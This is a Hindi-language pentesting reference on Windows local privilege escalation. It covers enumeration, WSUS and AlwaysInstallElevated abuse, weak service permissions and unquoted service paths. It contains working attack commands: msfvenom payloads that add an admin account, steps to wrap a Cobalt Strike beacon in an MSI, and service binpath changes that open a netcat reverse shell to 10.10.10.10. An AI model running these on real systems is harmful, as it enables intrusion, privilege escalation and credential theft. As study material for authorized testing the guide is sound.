# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में कई अलग-अलग चीजें हैं जो आपको सिस्टम को enumerate करने से रोक सकती हैं, executables चलाने से रोक सकती हैं या यहां तक कि आपकी गतिविधियों का detect भी कर सकती हैं। आपको privilege escalation enumeration शुरू करने से पहले निम्नलिखित पृष्ठ को पढ़ना चाहिए और इन सभी defenses mechanisms को enumerate करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

जांचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी देखें).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### संस्करण Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो Windows environment द्वारा प्रस्तुत **massive attack surface** को दर्शाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### पर्यावरण

क्या कोई क्रेडेंशियल/Juicy info env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell ट्रांसक्रिप्ट फ़ाइलें

आप सीख सकते हैं कि इसे कैसे चालू किया जाए: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline के निष्पादन का विवरण रिकॉर्ड होता है — इसमें निष्पादित कमांड, कमांड इनवोकेशन और स्क्रिप्ट के कुछ हिस्से शामिल होते हैं। हालांकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम हमेशा कैप्चर नहीं हो सकते।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Powershell logs से अंतिम 15 events देखने के लिए आप यह चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की सम्पूर्ण गतिविधियों और सामग्री का पूरा रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का प्रत्येक ब्लॉक चलने के समय दस्तावेजीकृत होता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो forensics और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेजीकृत करके, प्रक्रिया के बारे में विस्तृत जानकारी प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स Windows Event Viewer में निम्न पथ पर पाए जा सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
पिछले 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** के बजाय http के माध्यम से अनुरोध किए जा रहे हों तो आप सिस्टम को compromise कर सकते हैं।

आप यह जांचना शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी एक जैसा उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

तो, **it is exploitable.** यदि आख़िरी रजिस्ट्री का मान 0 है, तो WSUS एंट्री को अनदेखा कर दिया जाएगा।

इन कमजोरियों का फायदा उठाने के लिए आप ऐसे टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS ट्रैफ़िक में 'fake' अपडेट्स इंजेक्ट करते हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
बुनियादी तौर पर, यह वह दोष है जिसका यह बग फायदा उठाता है:

> यदि हमारे पास लोकल यूज़र प्रॉक्सी को संशोधित करने की क्षमता है, और Windows Updates Internet Explorer की सेटिंग्स में कॉन्फ़िगर किए गए प्रॉक्सी का उपयोग करता है, तो हम लोकली [PyWSUS](https://github.com/GoSecure/pywsus) चला कर अपनी ही ट्रैफ़िक को इंटरसेप्ट कर सकते हैं और अपने एसेट पर elevated user के रूप में कोड चला सकते हैं।
>
> इसके अलावा, चूँकि WSUS सेवा current user की सेटिंग्स का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट करें और इसे current user के certificate store में जोड़ दें, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को इंटरसेप्ट करने में सक्षम होंगे। WSUS किसी HSTS-like मैकेनिज़्म का उपयोग नहीं करता जो certificate पर trust-on-first-use प्रकार की वैलिडेशन लागू करे। यदि प्रस्तुत किया गया certificate user द्वारा trusted है और उसमें सही hostname है, तो सेवा द्वारा इसे स्वीकार कर लिया जाएगा।

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

A **local privilege escalation** vulnerability exists in Windows **domain** environments under specific conditions. These conditions include environments where **LDAP signing is not enforced,** users possess self-rights allowing them to configure **Resource-Based Constrained Delegation (RBCD),** and the capability for users to create computers within the domain. It is important to note that these **requirements** are met using **default settings**.

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter सेशन है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके ऑटोमेट कर सकते हैं

### PowerUP

power-up के `Write-UserAddMSI` कमांड का उपयोग करें ताकि वर्तमान डायरेक्टरी के अंदर एक Windows MSI binary बनाया जा सके जो privileges escalate करे। यह स्क्रिप्ट एक precompiled MSI installer लिखकर रखती है जो user/group addition के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
सिर्फ बनाया गया binary चलाएँ ताकि privileges बढ़ सकें।

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाना


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाना

- Cobalt Strike या Metasploit के साथ `C:\privesc\beacon.exe` में एक नया Windows EXE TCP payload **Generate** करें
- **Visual Studio** खोलें, **Create a new project** चुनें और खोज बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, स्थान के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- तब तक **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर नहीं पहुँच जाते। **Add** पर क्लिक करें और अपने द्वारा अभी जिनरेट किया गया Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer** जो इंस्टॉल किए गए ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फाइल चुनें और **OK** पर क्लिक करें। इससे यह सुनिश्चित होगा कि installer चलते ही beacon payload execute हो जाएगा।
- **Custom Action Properties** के तहत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- अगर warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने प्लेटफ़ॉर्म को x64 पर सेट किया है।

### MSI Installation

दुर्भावनापूर्ण `.msi` फ़ाइल की **installation** को बैकग्राउंड में चलाने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना उपयोगी है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उपयोग **local Administrator passwords के प्रबंधन** के लिए किया जाता है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **अद्वितीय, यादृच्छिक, और नियमित रूप से अपडेट** किया जाता है उन कंप्यूटरों पर जो domain से जुड़े होते हैं। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमतियाँ दी गई हों, जिससे वे अधिकृत होने पर local admin passwords देख सकें।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय हो, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अनविश्वसनीय प्रक्रियाओं द्वारा इसकी मेमोरी **पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **ब्लॉक** किया जा सके, जिससे सिस्टम और सुरक्षित हो।\
[**LSA Protection के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित रखना है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Domain credentials को Local Security Authority (LSA) द्वारा प्रमाणित किया जाता है और operating system components द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता का logon data किसी registered security package द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित कर दिए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूह सूचीबद्ध करें

आपको यह जांचना चाहिए कि जिन समूहों के आप सदस्य हैं उनमें से किसी के पास दिलचस्प permissions तो नहीं हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार प्राप्त समूह

यदि आप **किसी विशेषाधिकार प्राप्त समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार प्राप्त समूहों और उन्हें दुरुपयोग करके विशेषाधिकार बढ़ाने के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token हेरफेर

**और अधिक जानें** कि **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **दिलचस्प tokens के बारे में जानें** और उन्हें कैसे दुरुपयोग करें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग्ड उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रहे Processes

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, processes की सूची बनाते समय **process की command line के अंदर passwords देखें**.\
जाँचें कि क्या आप **किसी चल रहे binary को overwrite कर सकते हैं** या अगर आपके पास binary फ़ोल्डर की write permissions हैं ताकि आप संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का शोषण कर सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes binaries के permissions की जांच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फोल्डरों की permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप चल रहे प्रोसेस का मेमोरी डंप **procdump** from sysinternals का उपयोग करके बना सकते हैं। FTP जैसी सेवाओं में अक्सर **credentials in clear text in memory** होते हैं — मेमोरी डंप करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले Applications उपयोगकर्ता को CMD खोलने या डायरेक्टरीज़ ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
यह अनुशंसा की जाती है कि प्रत्येक service के लिए आवश्यक privilege level की जाँच करने हेतु _Sysinternals_ का binary **accesschk** मौजूद हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह सुझाव दिया जाता है कि जांचें कि "Authenticated Users" किसी भी सेवा में संशोधन कर सकते हैं या नहीं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 हुई है._\
_सेवा शुरू नहीं की जा सकती, या तो क्योंकि यह अक्षम है या क्योंकि इसके साथ कोई सक्षम डिवाइस संबद्ध नहीं है._

आप इसे निम्न का उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान दें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (for XP SP1)**

**एक अन्य workaround** इस समस्या का यह है कि निम्नलिखित चलाएँ:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

यदि किसी सेवा पर "Authenticated users" समूह के पास **SERVICE_ALL_ACCESS** है, तो सेवा के निष्पादन योग्य बाइनरी को संशोधित करना संभव है। संशोधित करने और निष्पादित करने के लिए **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
अधिकार विभिन्न अनुमतियों के माध्यम से बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: सेवा बाइनरी का पुनः कॉन्फ़िगरेशन करने की अनुमति देता है।
- **WRITE_DAC**: अनुमति पुनः कॉन्फ़िगरेशन सक्षम करता है, जिससे service कॉन्फ़िगरेशन बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: मालिकाना हासिल करने और अनुमति पुनः कॉन्फ़िगरेशन की अनुमति देता है।
- **GENERIC_WRITE**: service कॉन्फ़िगरेशन बदलने की क्षमता प्रदान करता है।
- **GENERIC_ALL**: यह भी service कॉन्फ़िगरेशन बदलने की क्षमता प्रदान करता है।

इस कमज़ोरी का पता लगाने और शोषण करने के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services बाइनरीज़ की कमजोर अनुमतियाँ

**जाँचें कि क्या आप उस बाइनरी को बदल सकते हैं जिसे कोई सेवा निष्पादित करती है** या क्या आपके पास उस फ़ोल्डर पर **write permissions** हैं जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप **wmic** का उपयोग करके उस सेवा द्वारा निष्पादित प्रत्येक बाइनरी प्राप्त कर सकते हैं (not in system32) और अपनी permissions की जाँच **icacls** से कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन अनुमतियाँ

आपको यह जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं।\
आप किसी सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** **जांच** कर यह पता लगा सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि हाँ, तो सेवा द्वारा निष्पादित बाइनरी को बदला जा सकता है।

निष्पादित बाइनरी के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह permission है, तो इसका मतलब है कि आप इस रजिस्ट्री से **सब-रजिस्ट्री बना सकते हैं**। Windows services के मामले में यह **मनमाना कोड चलाने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### बिना उद्धरण वाले Service Paths

यदि executable का path उद्धरण (quotes) के अंदर नहीं है, तो Windows स्पेस से पहले के हर हिस्से को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
सभी unquoted service paths सूचीबद्ध करें, जो built-in Windows services से संबंधित न हों:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इसका पता लगा सकते हैं और exploit कर सकते हैं** metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअली metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

